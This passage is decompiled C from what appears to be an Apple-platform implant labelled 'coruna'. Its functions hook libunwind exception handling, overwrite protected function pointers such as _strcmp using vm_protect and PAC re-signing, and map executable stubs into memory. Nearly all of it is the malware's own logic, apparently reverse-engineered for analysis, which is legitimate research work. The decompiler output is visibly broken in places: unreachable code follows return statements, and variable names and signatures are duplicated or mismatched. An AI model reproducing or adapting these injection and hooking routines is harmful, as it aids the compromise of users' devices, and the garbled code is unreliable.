                  bootargs[scratch + 2] = 0x9c;
                  type_id_8 = scratch + 3;
                  scratch = scratch + 4;
                  if (type_id_8 < scratch) {
                    bootargs[type_id_8] = err + '\x01';
                    err = err + '\x02';
                    if ((flags_2 >> 8 & 1) != 0) goto load_ok;
                    goto again;
                  }
                }
              }
            }
            else {
              bootargs[scratch] = 0x99;
              type_id_8 = scratch + 1;
              if (type_id_8 < scratch + 2) {
                bootargs[type_id_8] = err;
                bootargs[scratch + 2] = 0x9a;
                type_id_8 = scratch + 3;
                scratch = scratch + 4;
                if (type_id_8 < scratch) {
                  bootargs[type_id_8] = err + '\x01';
                  err = err + '\x02';
                  goto invalid;
                }
              }
            }
          }
          else {
            bootargs[scratch] = 0x97;
            type_id_8 = scratch + 1;
            if (type_id_8 < scratch + 2) {
              bootargs[type_id_8] = err;
              bootargs[scratch + 2] = 0x98;
              type_id_8 = scratch + 3;
              scratch = scratch + 4;
              if (type_id_8 < scratch) {
                bootargs[type_id_8] = err + '\x01';
                err = err + '\x02';
                goto nomem;
              }
            }
          }
        }
        else {
          bootargs[scratch] = 0x95;
          type_id_8 = scratch + 1;
          if (type_id_8 < scratch + 2) {
            bootargs[type_id_8] = err;
            bootargs[scratch + 2] = 0x96;
            type_id_8 = scratch + 3;
            scratch = scratch + 4;
            if (type_id_8 < scratch) {
              bootargs[type_id_8] = err + '\x01';
              err = err + '\x02';
              goto found;
            }
          }
        }
      }
      else {
        bootargs[scratch] = 0x93;
        type_id_8 = scratch + 1;
        if (type_id_8 < scratch + 2) {
          bootargs[type_id_8] = err;
          bootargs[scratch + 2] = 0x94;
          type_id_8 = scratch + 3;
          scratch = scratch + 4;
          if (type_id_8 < scratch) {
            bootargs[type_id_8] = err + '\x01';
            err = err + '\x02';
            goto retry;
          }
        }
      }
skip:
      scratch = type_id_8;
      type_id_8 = 0xad001;
  }
  else {
    err = '\0';
    type_id_8 = 0;
    if ((u != 0x4000000) && (u != 0x2000000)) {
      type_id_8 = 0xad005;
      if (u != 0x3000000) {
        type_id_8 = 0xad014;
      }
    }
  }
parse_ok:
  u = 0;
  if (type_id_8 != 0xad005) {
    u = type_id_8;
  }
  if (kind != 0) {
    u = kind;
  }
  port = (unsigned long)u;
  *(uint *)(bootargs + (unsigned long)(version - 4) + 4) = (scratch - version) + -4;
  if (*(long *)k_implant_stack_chk_guard_slot == action) {
  return;
  }
  ___stack_chk_fail(port);
  buf = (long *)handle[2];
  if ((buf == (long *)0x0) ||
     ((handle = *buf, handle == 0 ||
      (type_id_8 = *(uint *)(buf + 1), 0x4000 < scratch + type_id_8)))) {
    port = coruna_vec_push_pair(*handle + 0xe8,*handle + 0xf0);
    if (*(long *)k_implant_stack_chk_guard_slot == action) {
    return;
    }
    ___stack_chk_fail(port);
    handle[2] = *(long *)(*handle + 0xe8) + (unsigned long)(*(int *)(*handle + 0xf0) - 1) * 0x10;
    ptr = (void *)_mmap(0,0x4000,3,&k_implant_mmap_anon_fd,0xffffffff,0);
    *(void **)handle[2] = ptr;
    if (ptr == (void *)0xffffffffffffffff) {
      port = 0xad009;
      if (*(long *)k_implant_stack_chk_guard_slot == action) {
      return;
      }
      ___stack_chk_fail(port);
    }
    _bzero(ptr,0x4000);
    type_id_8 = 0;
    buf = (long *)handle[2];
    *(uint32_t *)(buf + 1) = 0;
    *(uint8_t *)((long)buf + 0xc) = 1;
    handle = *buf;
  }
  _memcpy((void *)(handle + (unsigned long)type_id_8),bootargs,(unsigned long)scratch);
  port = 0;
  *(uint *)(handle[2] + 8) = *(int *)(handle[2] + 8) + scratch;
fail:
  if (*(long *)k_implant_stack_chk_guard_slot == action) {
    return;
  }
  ___stack_chk_fail(port);
}





uint64_t coruna_implant65fc_residual_121(long handle,long addr_2,uint64_t val,uint64_t id_2,
            void (*indirect_target)
{
  uint32_t u;
  uint size;
  int *err;
  uint64_t version;
  int err;
  int *status;
  
  if (handle == 0) {
    return 0xad001;
  }
  if (indirect_target == (void (*)0x0) {
    return 0xad001;
  }
  if (((uint)id_2 >> 0x1e & 1) != 0) {
    if (*(int *)(handle + 0x18) != 0) {
      err = (int *)(handle + (unsigned long)*(uint *)(addr_2 + 8));
      do {
        status = err;
        err = status + 2;
      } while (*status != (int)val &&
               status < (int *)(handle +
                               (unsigned long)*(uint *)(handle + (unsigned long)*(uint *)(handle + 0x14) +
                                                (unsigned long)(*(int *)(handle + 0x18) - 1) * 0xc + 8)));
      if (*status == (int)val) {
        err = status[1];
        size = (uint)id_2 >> 0x1c & 3;
        u = 0;
        if (size != 0) {
        size = size - 1;
        if (*(uint *)(handle + 0x10) <= size) {
        return 0xad014;
        }
        u = *(uint32_t *)(handle + (unsigned long)*(uint *)(handle + 0xc) + (unsigned long)size * 4);
        }
        version = (*indirect_target)(val,id_2,err,u,0);
        return version;
      }
    }
    return 0xad014;
  }
  err = 0;
fail:
  size = (uint)id_2 >> 0x1c & 3;
  u = 0;
  if (size != 0) {
    size = size - 1;
    if (*(uint *)(handle + 0x10) <= size) {
      return 0xad014;
    }
    u = *(uint32_t *)(handle + (unsigned long)*(uint *)(handle + 0xc) + (unsigned long)size * 4);
  }
  version = (*indirect_target)(val,id_2,err,u,0);
  return version;
}





uint64_t
void coruna_unw_get_proc_info(uint64_t val,uint64_t id_2,uint64_t size_3,uint64_t off_4,
            unw_cursor_t *arg)
{
  uint u;
  uint size;
  uint version;
  int err;
  unw_word_t *ptr;
  uint64_t port;
  long handle;
  long *ptr;
  long addr;
  void (*ptr)(void);
  unw_proc_info_t scratch;
  unw_word_t bootargs;
  
  if (arg == (unw_cursor_t *)0x0) {
    return 0;
  }
  scratch.extra = 0;
  scratch.flags = 0;
  scratch.gp = 0;
  scratch.unwind_info = 0;
  scratch.format = 0;
  scratch.unwind_info_size = 0;
  scratch.end_ip = 0;
  scratch.start_ip = 0;
  scratch.handler = 0;
  scratch.lsda = 0;
  err = _unw_get_proc_info(arg,&scratch);
  if (err != 0) {
    return 0;
  }
  err = _pthread_mutex_lock((pthread_mutex_t *)&k_implant_rodata_word_24610);
  if (err != 0) {
    return 0;
  }
  bootargs = scratch.lsda;
  if (k_implant_rodata_word_24ca0 != 0) {
    err = (int)(scratch.lsda >> 0x20);
    u = ((int)scratch.lsda + -0x60b6453e) - (err + -0x61c88647) ^ 0x7f76d;
    size = (err + -0x60b6453e) - u ^ u << 8;
    version = 0xfeedbef7 - (u + size) ^ size >> 0xd;
    u = u - (size + version) ^ version >> 0xc;
    size = size - (version + u) ^ u << 0x10;
    version = version - (u + size) ^ size >> 5;
    u = u - (size + version) ^ version >> 3;
    size = size - (version + u) ^ u << 10;
    u = version - (u + size) ^ size >> 0xf;
    ptr = *(long **)(k_implant_rodata_word_24ca0 + 0x18);
    addr = *(long *)(*ptr + (unsigned long)((int)ptr[1] - 1U & u) * 0x10);
    if (addr != 0) {
      do {
        addr = addr - ptr[4];
        if (((*(uint *)(addr + 0x4c) == u) && (*(int *)(addr + 0x48) == 8)) &&
           (**(unw_word_t **)(addr + 0x40) == scratch.lsda)) {
          if (k_implant_rodata_word_24ca8 != 0) {
            err = (uint)*(byte *)(addr + 0x17) * 0x1000000 + -0x61c88647 +
                    (uint)*(byte *)(addr + 0x16) * 0x10000 + (uint)*(byte *)(addr + 0x15) * 0x100
                    + (uint)*(byte *)(addr + 0x14);
            u = (((uint)*(byte *)(addr + 0x13) * 0x1000000 + -0x60b6453e) - err) +
                    (uint)*(byte *)(addr + 0x12) * 0x10000 + (uint)*(byte *)(addr + 0x11) * 0x100
                    + (uint)*(byte *)(addr + 0x10) ^ 0x7f76d;
            size = (err + 0x1124109) - u ^ u << 8;
            version = 0xfeedbef7 - (u + size) ^ size >> 0xd;
            u = u - (size + version) ^ version >> 0xc;
            size = size - (version + u) ^ u << 0x10;
            version = version - (u + size) ^ size >> 5;
            u = u - (size + version) ^ version >> 3;
            size = size - (version + u) ^ u << 10;
            u = version - (u + size) ^ size >> 0xf;
            ptr = *(long **)(k_implant_rodata_word_24ca8 + 0x10);
            handle = *(long *)(*ptr + (unsigned long)((int)ptr[1] - 1U & u) * 0x10);
            if (handle != 0) {
              goto fail;
            }
          }
          break;
        }
        addr = *(long *)(addr + 0x38);
      } while (addr != 0);
    }
  }
  _pthread_mutex_unlock((pthread_mutex_t *)&k_implant_rodata_word_24610);
  return 0;
  while (handle = *(long *)(handle + 0x30), handle != 0) {
fail:
    handle = handle - ptr[4];
    if (((*(uint *)(handle + 0x44) == u) && (*(int *)(handle + 0x40) == 8)) &&
       (**(long **)(handle + 0x38) == *(long *)(addr + 0x10))) {
      if (scratch.extra == 0) {
        ptr = _memmem(arg,0x598,&scratch,0x48);
        if (ptr == (unw_word_t *)0x0) break;
        scratch.extra = *(unw_word_t *)(addr + 8);
        ptr[5] = scratch.flags;
        ptr[4] = scratch.gp;
        ptr[7] = scratch.unwind_info;
        ptr[6] = scratch;
        ptr[3] = scratch.handler;
        ptr[2] = scratch.lsda;
        ptr[1] = scratch.end_ip;
        *ptr = scratch.start_ip;
        ptr[8] = scratch.extra;
      }
      ptr = *(void (**)(handle + 8);
      _pthread_mutex_unlock((pthread_mutex_t *)&k_implant_rodata_word_24610);
      port = (*ptr)(val,id_2,size_3,off_4,arg);
      return port;
    }
  }
done:
  _pthread_mutex_unlock((pthread_mutex_t *)&k_implant_rodata_word_24610);
  return 0;
}





uint64_t coruna_sign_extend_uleb(unsigned long *arg,long handle,uint *size,unsigned long arg)
{
  uint64_t u;
  unsigned long scratch;
  unsigned long bootargs;
  
  scratch = 0;
  bootargs = 0;
  u = 0xad001;
  if ((((arg != (unsigned long *)0x0) && (handle != 0)) && (size != (uint *)0x0)) &&
     ((*size < arg &&
      (u = coruna_read_uleb128(&bootargs,&scratch,handle,size,arg), (int)u == 0)))) {
    if ((*(byte *)(handle + (unsigned long)(*size - 1)) >> 6 & 1) == 0) {
      u = 0;
    }
    else {
      u = 0;
      *arg = bootargs | -1L << (scratch & 0x3f);
    }
  }
  return u;
}





uint64_t
void coruna_implant65fc_via_sign_extend_uleb(unsigned long *arg,uint size,long handle,uint *flags_2,unsigned long arg,int flags)
{
  unsigned long *ptr;
  uint u;
  unsigned long size;
  bool err;
  uint64_t version;
  uint port;
  unsigned long scratch;
  unsigned long bootargs;
  
  if (arg == (unsigned long *)0x0) {
    return 0xad001;
  }
  if (handle == 0) {
    return 0xad001;
  }
  if (flags_2 == (uint *)0x0) {
    return 0xad001;
  }
  port = *flags_2;
  if (arg <= port) {
    return 0xad001;
  }
  if (size == 0xff) {
    bootargs = 0;
    version = 0;
    *arg = bootargs;
  }
  u = size & 0xf;
  version = 0xad008;
  if (0xc < u) {
    return 0xad008;
  }
  ptr = (unsigned long *)(handle + (unsigned long)port);
  switch(u) {
  case 0:
  case 4:
    scratch = *ptr;
    port = port + 8;
    break;
  case 1:
    scratch = 0;
    bootargs = 0;
    version = coruna_read_uleb128(&scratch,&bootargs);
    err = false;
    bootargs = 0;
    goto done;
  case 2:
    scratch = (unsigned long)(ushort)*ptr;
    port = port + 2;
    break;
  case 3:
    scratch = (unsigned long)(uint)*ptr;
    port = port + 4;
    break;
  default:
    return version;
  case 8:
  case 0xc:
    bootargs = *ptr;
    port = port + 8;
    goto cleanup;
  case 9:
    bootargs = 0;
    version = coruna_sign_extend_uleb(&bootargs,handle,flags_2,arg);
    scratch = 0;
    err = true;
done:
    if ((int)version != 0) {
      return version;
    }
    port = 0;
    if (flags == 0) {
    port = size & 0x70;
    }
    if (port == 0x10) {
    size = scratch;
    if (!(bool)(u == 0 & (err ^ 1U))) {
    size = bootargs;
    }
    if (u != 0 && !err) {
    size = scratch;
    }
    bootargs = size + (long)ptr;
    }
    else {
    if (port != 0) {
    return 0xad008;
    }
    if (!err) {
    bootargs = scratch;
    }
    }
    version = 0;
    *arg = bootargs;
  case 10:
    bootargs = (unsigned long)(short)*ptr;
    port = port + 2;
    goto cleanup;
  case 0xb:
    bootargs = (unsigned long)(int)(uint)*ptr;
    port = port + 4;
cleanup:
    scratch = 0;
    *flags_2 = port;
    err = true;
    port = 0;
    if (flags == 0) {
    port = size & 0x70;
    }
    if (port == 0x10) {
    size = scratch;
    if (!(bool)(u == 0 & (err ^ 1U))) {
    size = bootargs;
    }
    if (u != 0 && !err) {
    size = scratch;
    }
    bootargs = size + (long)ptr;
    }
    else {
    if (port != 0) {
    return 0xad008;
    }
    if (!err) {
    bootargs = scratch;
    }
    }
    version = 0;
    *arg = bootargs;
  }
  err = false;
  bootargs = 0;
  *flags_2 = port;
check_ok:
  port = 0;
  if (flags == 0) {
    port = size & 0x70;
  }
  if (port == 0x10) {
    size = scratch;
    if (!(bool)(u == 0 & (err ^ 1U))) {
      size = bootargs;
    }
    if (u != 0 && !err) {
      size = scratch;
    }
    bootargs = size + (long)ptr;
  }
  else {
    if (port != 0) {
      return 0xad008;
    }
    if (!err) {
      bootargs = scratch;
    }
  }
fail:
  version = 0;
  *arg = bootargs;
switchD_00016ef4_caseD_5:
  return version;
}





uint64_t coruna_read_uleb128(unsigned long *arg,unsigned long *arg,long handle,uint *size,unsigned long val)
{
  byte err;
  byte status;
  unsigned long u;
  uint64_t size;
  unsigned long version;
  byte flags;
  uint port;
  unsigned long tag;
  unsigned long kind;
  
  size = 0xad001;
  if (((arg != (unsigned long *)0x0) && (handle != 0)) && (size != (uint *)0x0)) {
    port = *size;
    kind = (unsigned long)port;
    if (kind < arg) {
      version = 0;
      u = 0;
      flags = 1;
      do {
        tag = u;
        port = port + 1;
        status = *(byte *)(handle + kind);
        version = version | (long)(int)((status & 0x7f) << (unsigned long)((uint)tag & 0x1f));
        err = status >> 7;
        if (0x32 < tag) {
          err = flags;
        }
        *size = port;
      } while ((tag < 0x33) &&
              (kind = (unsigned long)port, u = tag + 7, flags = err,
              (status & 0x80) != 0 && kind < arg));
      if (0x32 < tag || err != 0) {
        return 0xad014;
      }
      size = 0;
      *arg = version;
      *val = tag + 7;
    }
  }
  return size;
}





uint64_t coruna_implant65fc_via_identity_6080_2(long handle,uint64_t val,pthread_mutex_t *arg)
{
  uint64_t *ptr;
  unsigned long u;
  uint size;
  uint version;
  bool err;
  int err;
  uint64_t port;
  long handle;
  unsigned long tag;
  long addr;
  unsigned long kind;
  uint64_t type_id;
  long scratch;
  pthread_mutex_t *bootargs;
  char thread_attr;
  long host_info;
  uint64_t serial_buf;
  
  type_id = 0xad001;
  if ((handle != 0) && (arg != (pthread_mutex_t *)0x0)) {
    err = _pthread_mutex_lock(arg);
    if (err == 0) {
      if ((char)arg[1].__sig == '\0') {
        arg[1].__opaque[0xc] = '\x01';
        arg[1].__opaque[0] = '\0';
        arg[1].__opaque[1] = '\0';
        arg[1].__opaque[2] = '\0';
        arg[1].__opaque[3] = '\0';
        arg[1].__opaque[4] = '\0';
        arg[1].__opaque[5] = '\0';
        arg[1].__opaque[6] = '\0';
        arg[1].__opaque[7] = '\0';
        arg[1].__opaque[8] = '\0';
        arg[1].__opaque[9] = '\0';
        arg[1].__opaque[10] = '\0';
        arg[1].__opaque[0xb] = '\0';
        host_info = 0;
        port = coruna_implant65fc_via_ctx_free_11dc8(handle,val,0,0,&host_info);
        if ((int)port == 0) {
          thread_attr = '\0';
          scratch = handle;
          bootargs = arg;
          if (host_info != 0) {
            if ((*(ushort *)(host_info + 0x1c0) >> 7 & 1) == 0) {
              type_id = coruna_implant65fc_via_implant65fc_via_bzero_5_2(host_info,coruna_mach_vm_read_overwrite,&scratch);
              err = (int)type_id;
joined_r0x0001733c:
              if (err == 0) {
                if (thread_attr == '\0') {
                  type_id = 0x18012;
                }
                else {
                  type_id = 0;
                  *(uint8_t *)&arg[1].__sig = 1;
                }
              }
            }
            else {
              addr = *(long *)(host_info + 8);
              tag = 0;
              do {
                if (*(long *)(addr + tag) == -0x55fdfc1e55fefc20) {
                  size = *(uint *)(addr + tag + 8);
                  if ((size & 0x7c000000) == 0x14000000) {
                    u = (unsigned long)(size & 0x1ffffff);
                    if ((size & 0x2000000) != 0) {
                      u = (unsigned long)size | 0xfffffffffe000000;
                    }
                    size = *(uint *)(addr + u * 4 + tag + 8);
                    if (((size & 0x9f000000) == 0x90000000) &&
                       (version = *(uint *)(addr + u * 4 + tag + 0xc),
                       (version & 0x7f000000) == 0x11000000)) {
                      kind = (unsigned long)(version >> 10) & 0xfff;
                      if ((version & 0xc00000) != 0) {
                        kind = kind << 0xc;
                      }
                      ptr = (uint64_t *)
                               ((addr + u * 4 + tag + 8 & 0xfffffffffffff000) +
                                (long)(int)(size >> 0x11 & 0x3000 | (size >> 5) << 0xe) + kind);
                      if (ptr == (uint64_t *)0x0) goto fail;
                      addr = coruna_identity_6080(k_implant_strcmp_slot);
                      handle = coruna_identity_6080(*ptr);
                      if (addr == handle) {
                        serial_buf = 0;
                        type_id = coruna_mach_vm_machine_attribute(arg,handle,&serial_buf);
                        if ((int)type_id == 0) {
                          serial_buf = coruna_implant65fc_via_pacia(serial_buf,ptr);
                          type_id = coruna_vm_protect(ptr,serial_buf);
                        }
                      }
                      else {
                        type_id = 0;
                      }
                      thread_attr = '\x01';
                      err = (int)type_id;
                      goto joined_r0x0001733c;
                    }
                  }
                }
                err = tag < 0x7ffc;
                tag = tag + 4;
              } while (err);
              type_id = 0xad000;
            }
          }
fail:
          coruna_ctx_free_11dc8(host_info);
          port = type_id;
        }
      }
      else {
        port = 0;
      }
      type_id = port;
      _pthread_mutex_unlock(arg);
    }
    else {
      type_id = 0x18013;
    }
  }
  return type_id;
}





uint32_t coruna_pthread_mutex_init(long handle,pthread_mutex_t *arg)
{
  int err;
  uint32_t u;
  
  u = 0xad001;
  if ((handle != 0) && (arg != (pthread_mutex_t *)0x0)) {
    arg[1].__opaque[8] = '\0';
    arg[1].__opaque[9] = '\0';
    arg[1].__opaque[10] = '\0';
    arg[1].__opaque[0xb] = '\0';
    arg[1].__opaque[0xc] = '\0';
    arg[1].__opaque[0xd] = '\0';
    arg[1].__opaque[0xe] = '\0';
    arg[1].__opaque[0xf] = '\0';
    arg->__opaque[0x30] = '\0';
    arg->__opaque[0x31] = '\0';
    arg->__opaque[0x32] = '\0';
    arg->__opaque[0x33] = '\0';
    arg->__opaque[0x34] = '\0';
    arg->__opaque[0x35] = '\0';
    arg->__opaque[0x36] = '\0';
    arg->__opaque[0x37] = '\0';
    arg->__opaque[0x28] = '\0';
    arg->__opaque[0x29] = '\0';
    arg->__opaque[0x2a] = '\0';
    arg->__opaque[0x2b] = '\0';
    arg->__opaque[0x2c] = '\0';
    arg->__opaque[0x2d] = '\0';
    arg->__opaque[0x2e] = '\0';
    arg->__opaque[0x2f] = '\0';
    arg[1].__opaque[0] = '\0';
    arg[1].__opaque[1] = '\0';
    arg[1].__opaque[2] = '\0';
    arg[1].__opaque[3] = '\0';
    arg[1].__opaque[4] = '\0';
    arg[1].__opaque[5] = '\0';
    arg[1].__opaque[6] = '\0';
    arg[1].__opaque[7] = '\0';
    arg[1].__sig = 0;
    arg->__opaque[0x10] = '\0';
    arg->__opaque[0x11] = '\0';
    arg->__opaque[0x12] = '\0';
    arg->__opaque[0x13] = '\0';
    arg->__opaque[0x14] = '\0';
    arg->__opaque[0x15] = '\0';
    arg->__opaque[0x16] = '\0';
    arg->__opaque[0x17] = '\0';
    arg->__opaque[8] = '\0';
    arg->__opaque[9] = '\0';
    arg->__opaque[10] = '\0';
    arg->__opaque[0xb] = '\0';
    arg->__opaque[0xc] = '\0';
    arg->__opaque[0xd] = '\0';
    arg->__opaque[0xe] = '\0';
    arg->__opaque[0xf] = '\0';
    arg->__opaque[0x20] = '\0';
    arg->__opaque[0x21] = '\0';
    arg->__opaque[0x22] = '\0';
    arg->__opaque[0x23] = '\0';
    arg->__opaque[0x24] = '\0';
    arg->__opaque[0x25] = '\0';
    arg->__opaque[0x26] = '\0';
    arg->__opaque[0x27] = '\0';
    arg->__opaque[0x18] = '\0';
    arg->__opaque[0x19] = '\0';
    arg->__opaque[0x1a] = '\0';
    arg->__opaque[0x1b] = '\0';
    arg->__opaque[0x1c] = '\0';
    arg->__opaque[0x1d] = '\0';
    arg->__opaque[0x1e] = '\0';
    arg->__opaque[0x1f] = '\0';
    arg->__opaque[0] = '\0';
    arg->__opaque[1] = '\0';
    arg->__opaque[2] = '\0';
    arg->__opaque[3] = '\0';
    arg->__opaque[4] = '\0';
    arg->__opaque[5] = '\0';
    arg->__opaque[6] = '\0';
    arg->__opaque[7] = '\0';
    arg->__sig = 0;
    err = _pthread_mutex_init(arg,(pthread_mutexattr_t *)0x0);
    u = 0;
    if (err != 0) {
      u = 0x18013;
    }
  }
  return u;
}





uint64_t coruna_implant65fc_via_implant65fc_via_implant65fc_via_mach_vm_region_recurse(long handle,pthread_mutex_t *arg)
{
  int err;
  uint64_t u;
  
  u = 0xad001;
  if ((handle != 0) && (arg != (pthread_mutex_t *)0x0)) {
    err = _pthread_mutex_lock(arg);
    if (err == 0) {
      if (((char)arg[1].__sig == '\0') || (arg[1].__opaque[0xc] != '\0')) {
        u = 0;
      }
      else if (*(long *)arg[1].__opaque == 0) {
        u = 0;
        arg[1].__opaque[0xc] = '\x01';
      }
      else {
        u = coruna_implant65fc_via_implant65fc_via_mach_vm_region_recurse(handle,*(uint32_t *)k_implant_mach_task_self_slot,
                             *(long *)arg[1].__opaque,*(uint32_t *)(arg[1].__opaque + 8));
      }
      _pthread_mutex_unlock(arg);
    }
    else {
      u = 0x18013;
    }
  }
  return u;
}





uint64_t coruna_mach_vm_read_overwrite(uint64_t val,mach_vm_address_t *arg,uint64_t *id_2)
{
  int err;
  kern_return_t lk2;
  uint64_t u;
  uint64_t scratch;
  mach_vm_size_t bootargs;
  uint8_t *thread_attr;
  
  if (id_2 == (uint64_t *)0x0) {
    return 0xad001;
  }
  if (arg != (mach_vm_address_t *)0x0) {
    if ((char *)arg[1] == (char *)0x0) {
      return 0;
    }
    err = _strcmp((char *)arg[1],"_strcmp");
    if (err == 0) {
      bootargs = 0;
      thread_attr = (uint8_t *)0x0;
      lk2 = _mach_vm_read_overwrite
                        (*(vm_map_t *)k_implant_mach_task_self_slot,*arg,8,
                         (mach_vm_address_t)&thread_attr,&bootargs);
      if (lk2 != 0 || bootargs != 8) {
        return 0x1800e;
      }
      if (thread_attr == k_implant_strcmp_slot) {
        scratch = 0;
        u = coruna_mach_vm_machine_attribute(id_2[1],*id_2,&scratch);
        if ((int)u == 0) {
          u = coruna_vm_protect(*arg,scratch);
        }
      }
      else {
        u = 0;
      }
      *(uint8_t *)(id_2 + 2) = 1;
      return u;
    }
  }
  return 0;
}





uint64_t coruna_mach_vm_machine_attribute(long handle,long addr_2,long *off_3)
{
  uint8_t *ptr;
  int err;
  void *address;
  uint64_t u;
  vm_machine_attribute_val_t scratch;
  uint8_t bootargs;
  
  u = 0xad001;
  if ((handle != 0) && (off_3 != (long *)0x0)) {
    if (*(long *)(handle + 0x48) == 0) {
      if (addr_2 != 0) {
        u = 0x18011;
        address = (void *)_mmap(0,0x38,3,&k_implant_mmap_anon_fd,0xffffffff,0);
        if (address != (void *)0xffffffffffffffff) {
          _memcpy(address,coruna_implant65fc_residual_84,0x38);
          *(uint8_t **)((long)address + 0x30) = k_implant_strcmp_slot;
          ptr = k_implant_mach_task_self_slot;
          bootargs = 0;
          err = coruna_mach_vm_protect_fec8(addr_2,*(uint32_t *)k_implant_mach_task_self_slot,address,0x38,5,
                               &bootargs);
          if (err == 0) {
            scratch = 6;
            _mach_vm_machine_attribute
                      (*(vm_map_t *)ptr,(mach_vm_address_t)address,0x38,1,&scratch);
            u = 0;
            *(void **)(handle + 0x48) = address;
            *(uint32_t *)(handle + 0x50) = 0x38;
            *(uint8_t *)(handle + 0x54) = bootargs;
            *off_3 = (long)address;
          }
          else {
            _munmap(address,0x38);
          }
        }
      }
    }
    else {
      u = 0;
      *off_3 = *(long *)(handle + 0x48);
    }
  }
  return u;
}





unsigned long coruna_vm_protect(uint64_t *arg,uint64_t val)

{
  uint8_t *entry_9;
  uint size;
  uint type_id_8;
  unsigned long version;
  uint8_t frame;
  uint8_t work;
  vm_prot_t cache_48;
  
  entry_9 = k_implant_mach_task_self_slot;
  if (arg != (uint64_t *)0x0) {
    version = coruna_mach_vm_region_recurse(*(uint32_t *)k_implant_mach_task_self_slot,arg,8,&cache_48,&work
                         ,&frame);
    if ((int)version == 0) {
      if (((byte)cache_48 >> 1 & 1) == 0) {
        size = _vm_protect(*(vm_map_t *)entry_9,(vm_address_t)arg,8,0,3);
        if (size == 0) {
          *arg = val;
          type_id_8 = _vm_protect(*(vm_map_t *)entry_9,(vm_address_t)arg,8,0,cache_48);
          size = 0;
          if (type_id_8 != 0) {
            size = type_id_8 | 0x80000000;
          }
          version = (unsigned long)size;
        }
        else {
          version = (unsigned long)(size | 0x80000000);
        }
      }
      else {
        version = 0;
        *arg = val;
      }
    }
    return version;
  }
  return 0xad001;
}





unsigned long coruna_macho_data_seg(long arg,uint64_t val,pthread_mutex_t *n)

{
  uint8_t *entry_9;
  int j;
  uint type_id_8;
  char *copy;
  unsigned long port;
  uint64_t tag;
  byte *data;
  unsigned long type_id_13;
  void *address;
  uint8_t cache_61;
  unsigned long host_info;
  unsigned long serial_buf;
  
  type_id_13 = 0xad00b;
  if (arg == 0) {
    return 0xad001;
  }
  if (n == (pthread_mutex_t *)0x0) {
    return 0xad001;
  }
  j = _pthread_mutex_lock(n);
  if (j != 0) {
    return 0xad00b;
  }
  if ((char)n[1].__sig != '\0') {
    type_id_13 = 0;
    _pthread_mutex_unlock(n);
    return type_id_13;
  }
  n[1].__opaque[0xc] = '\x01';
  n[1].__opaque[0] = '\0';
  n[1].__opaque[1] = '\0';
  n[1].__opaque[2] = '\0';
  n[1].__opaque[3] = '\0';
  n[1].__opaque[4] = '\0';
  n[1].__opaque[5] = '\0';
  n[1].__opaque[6] = '\0';
  n[1].__opaque[7] = '\0';
  n[1].__opaque[8] = '\0';
  n[1].__opaque[9] = '\0';
  n[1].__opaque[10] = '\0';
  n[1].__opaque[0xb] = '\0';
  serial_buf = 0;
  copy = _getsectdatafromFramework("libunwind.dylib","__DATA","__bss",&serial_buf);
  _pthread_mutex_unlock(n);
  return type_id_13;
  data = (byte *)(copy + 1);
  if (*data < 3) {
    port = __NSGetMachExecuteHeader();
    _pthread_mutex_unlock(n);
    return type_id_13;
    address = *(void **)n[1].__opaque;
    if (address == (void *)0x0) {
      serial_buf = (unsigned long)data & 0xfffffffffffff000;
      host_info = port;
      address = (void *)_mmap(0,0x78,3,&k_implant_mmap_anon_fd,0xffffffff,0);
      _pthread_mutex_unlock(n);
      return type_id_13;
      _memcpy(address,coruna_pad_stub,0x78);
      *(unsigned long *)((long)address + 0x68) = serial_buf;
      *(unsigned long *)((long)address + 0x70) = host_info;
      entry_9 = k_implant_mach_task_self_slot;
      host_info = host_info & 0xffffffffffffff00;
      j = coruna_mach_vm_protect_fec8(arg,*(uint32_t *)k_implant_mach_task_self_slot,address,0x78,5,
                           &host_info);
      if (j != 0) {
        _munmap(address,0x78);
        _pthread_mutex_unlock(n);
        return type_id_13;
      }
      serial_buf = coruna_u64_pack((serial_buf), (6));
      _mach_vm_machine_attribute
                (*(vm_map_t *)entry_9,(mach_vm_address_t)address,0x78,1,
                 (vm_machine_attribute_val_t *)&serial_buf);
      *(void **)n[1].__opaque = address;
      n[1].__opaque[8] = 'x';
      n[1].__opaque[9] = '\0';
      n[1].__opaque[10] = '\0';
      n[1].__opaque[0xb] = '\0';
      n[1].__opaque[0xc] = (char)host_info;
    }
    entry_9 = k_implant_mach_task_self_slot;
    copy = copy + 8;
    type_id_13 = 0xad001;
    _pthread_mutex_unlock(n);
    return type_id_13;
    serial_buf = serial_buf & 0xffffffff00000000;
    host_info = host_info & 0xffffffffffffff00;
    cache_61 = 0;
    type_id_13 = coruna_mach_vm_region_recurse(*(uint32_t *)k_implant_mach_task_self_slot,copy,8,&serial_buf,&host_info,
                         &cache_61);
    _pthread_mutex_unlock(n);
    return type_id_13;
    if (((byte)serial_buf >> 1 & 1) == 0) {
      type_id_8 = _vm_protect(*(vm_map_t *)entry_9,(vm_address_t)copy,8,0,3);
      if (type_id_8 == 0) {
        tag = coruna_implant65fc_via_pacia(address,0);
        *(uint64_t *)copy = tag;
        type_id_8 = _vm_protect(*(vm_map_t *)entry_9,(vm_address_t)copy,8,0,(vm_prot_t)serial_buf);
        if (type_id_8 == 0) goto load_ok_59;
      }
      type_id_13 = (unsigned long)(type_id_8 | 0x80000000);
      _pthread_mutex_unlock(n);
      return type_id_13;
    }
    tag = coruna_implant65fc_via_pacia(address,0);
    *(uint64_t *)copy = tag;
load_ok_59:
    *data = 3;
  }
  *(uint8_t *)&n[1].__sig = 1;
  type_id_13 = 0;
load_ok_58:
  _pthread_mutex_unlock(n);
  return type_id_13;
}





uint64_t coruna_implant65fc_via_implant65fc_via_implant65fc_via_mach_vm_region_recurse_2(long handle,pthread_mutex_t *arg)
{
  int err;
  uint64_t u;
  
  u = 0xad001;
  if ((handle != 0) && (arg != (pthread_mutex_t *)0x0)) {
    err = _pthread_mutex_lock(arg);
    if (err == 0) {
      if (((char)arg[1].__sig == '\0') || (arg[1].__opaque[0xc] != '\0')) {
        u = 0;
      }
      else if (*(long *)arg[1].__opaque == 0) {
        u = 0;
        arg[1].__opaque[0xc] = '\x01';
      }
      else {
        u = coruna_implant65fc_via_implant65fc_via_mach_vm_region_recurse(handle,*(uint32_t *)k_implant_mach_task_self_slot,
                             *(long *)arg[1].__opaque,*(uint32_t *)(arg[1].__opaque + 8));
      }
      _pthread_mutex_unlock(arg);
    }
    else {
      u = 0x18013;
    }
  }
  return u;
}





uint64_t coruna_mach_port_deallocate(uint64_t *val)
{
  uint64_t u;
  
